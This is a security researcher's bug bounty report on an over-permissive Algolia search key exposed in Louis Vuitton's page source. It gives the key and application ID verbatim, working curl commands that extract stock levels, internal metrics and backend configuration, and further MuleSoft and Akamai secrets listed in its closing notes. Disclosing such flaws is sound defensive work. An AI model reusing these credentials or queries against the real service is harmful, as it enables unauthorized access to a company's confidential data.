# Bug Bounty Report: Exposed Algolia API Key Leaking Sensitive Business Data

## Summary

An Algolia API key with `search`, `listIndexes`, and `settings` permissions is exposed in the client-side JavaScript/HTML of `us.louisvuitton.com` (and all country locales). This key provides **unauthenticated access** to the entire product catalog across all regions, including sensitive internal business data such as real-time inventory stock levels, internal conversion metrics, pricing strategy data, and backend configuration.

---

## Severity: **High**

---

## Affected Asset

- **URL:** `https://us.louisvuitton.com/eng-us/homepage` (and all `[country].louisvuitton.com` locales)
- **Exposed in:** Client-side rendered HTML (`__NUXT__` state / SSR payload)
- **Algolia Application ID:** `9B5OL3HHSM`
- **Algolia API Key:** `a2263f2e7f09a315abd6d9855972d585`

---

## Vulnerability Details

The Algolia search API key is embedded in the server-side rendered page source of all `*.louisvuitton.com` country locale sites. While search-only keys are commonly exposed for client-side search functionality, this particular key has **overly permissive access** that leaks sensitive business intelligence data.

### Confirmed Permissions (via `/1/keys/{key}` endpoint):
```json
{
  "acl": ["search", "listIndexes", "settings"],
  "validity": 0,
  "description": "<redacted>"
}
```

---

## Impact — "What Can an Attacker Gain?"

### 1. Full Inventory Intelligence (Competitive Threat)
An attacker (or competitor) can query **real-time stock levels** for all 163,409+ products across every locale:

```
GET /1/indexes/sku-en-us/query
Body: {"query":"","filters":"stockLevel > 0","attributesToRetrieve":["skuId","displayName","price","stockLevel"]}
```

**Result:** 3,259 products with exact stock counts exposed (e.g., a $15,300 item with `stockLevel: 1`).

### 2. Internal Business Metrics Exposure
Each product record exposes fields intended only for internal analytics:

| Field | Description | Risk |
|-------|-------------|------|
| `stockLevel` | Exact inventory count | Competitor intelligence, enables scalping bots |
| `cfaRate` | Internal conversion analytics | Business strategy leak |
| `digitalConversion` | Digital sales performance | Business strategy leak |
| `turnoverClassification` | Product revenue priority (1-5) | Revenue prioritization leak |
| `omsAvailability` | Order Management System real-time status | Infrastructure intel |
| `priceDetail.currentBeginDate` | When current price took effect | Pricing strategy leak |
| `sellableChannels` | Internal channel distribution | Omnichannel strategy leak |

### 3. Full Index Enumeration
The key allows listing all 200+ indexes, revealing:
- All country locales and their configurations
- `BFF_CONFIG` — Backend-for-Frontend service configuration
- `cm-rule` — Content Management business rules for PLPs
- `store-*` — All physical store data per locale
- `neural-sku-*` — AI/ML search model indexes
- Internal test indexes (e.g., `sku-en-us-MSR-TEST`)

### 4. Index Settings Disclosure
Full index configuration is readable, including:
- `attributesForFaceting` (149 internal attributes)
- `searchableAttributes` (full schema)
- `replicas` and neural search model configuration
- `unretrievableAttributes: None` — meaning ALL attributes are retrievable

---

## Steps to Reproduce

### Step 1: Extract the API key
View source of `https://us.louisvuitton.com/eng-us/homepage` and search for `apiKey` or `appId` in the `__NUXT__` state payload.

### Step 2: List all indexes
```bash
curl -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
     -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
     "https://9B5OL3HHSM-dsn.algolia.net/1/indexes"
```

### Step 3: Query sensitive stock data
```bash
curl -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
     -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
     -H "Content-Type: application/json" \
     -X POST \
     -d '{"query":"","hitsPerPage":5,"filters":"stockLevel > 0 AND price > 10000","attributesToRetrieve":["skuId","displayName","price","stockLevel","cfaRate","digitalConversion","turnoverClassification"]}' \
     "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/sku-en-us/query"
```

### Step 4: Read BFF configuration
```bash
curl -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
     -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
     -H "Content-Type: application/json" \
     -X POST \
     -d '{"query":"","hitsPerPage":10}' \
     "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/BFF_CONFIG/query"
```

### Step 5: Read index settings
```bash
curl -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
     -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
     "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/sku-en-us/settings"
```

---

## Evidence (Sample Output)

### High-value item with stock level exposed:
```
SKU: N40853 | LV x Darjeeling Limited Coffret Accessoires
Price: $15,300 | Stock: 1 | Orderable: True
Turnover Class: 1 | CFA Rate: 0.021 | Digital Conversion: 1.7
```

### API Key permissions confirmed:
```json
{
  "value": "a2263f2e7f09a315abd6d9855972d585",
  "acl": ["search", "listIndexes", "settings"],
  "validity": 0
}
```

### Total accessible data:
- **19,607 SKUs** in US index alone
- **3,259 SKUs** with stock levels exposed
- **3,103 items** priced above $10,000
- **200+ indexes** across all locales globally
- **BFF_CONFIG** internal service configuration accessible

---

## Recommended Remediation

1. **Immediately rotate the Algolia API key**
2. **Restrict the new key's permissions** — remove `listIndexes` and `settings` ACLs for the frontend key
3. **Configure `unretrievableAttributes`** in Algolia index settings to hide sensitive fields:
   - `stockLevel`
   - `cfaRate`
   - `digitalConversion`
   - `turnoverClassification`
   - `omsAvailability`
   - `priceDetail`
   - `sellableChannels`
   - `cscSellable` / `cscOrderable`
4. **Move the `BFF_CONFIG` index** to a separate Algolia app or restrict access with a different key
5. **Restrict index access** on the public key to only the necessary locale indexes (e.g., just `sku-en-us` for US site users)

---

## Additional Notes

During recon, I also observed the following credentials exposed in the same client-side source (not validated due to Akamai WAF blocking):
- **MuleSoft DAM Client ID:** `c2c8354eb1574ceea3ef19d91c800a91`
- **MuleSoft DAM Client Secret:** `88048424F55f41a1B36E510554Ac6A3a`
- **Akamai Cache Bypass Key:** `4H7CrjvjcmRg96r`

These were not exploitable from my testing environment but should be reviewed and rotated as a precaution.

---

## Classification

- **Vulnerability Type:** Exposed secrets, credentials or sensitive information on an asset under our control and affecting at least one of our scopes
- **CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
- **CVSS:** 7.5 (High) — Network/Low/None/None — Confidentiality: High

---

**Tested with User-Agent suffix:** `lvm-ywh-pbb`

**Researcher:** Ash
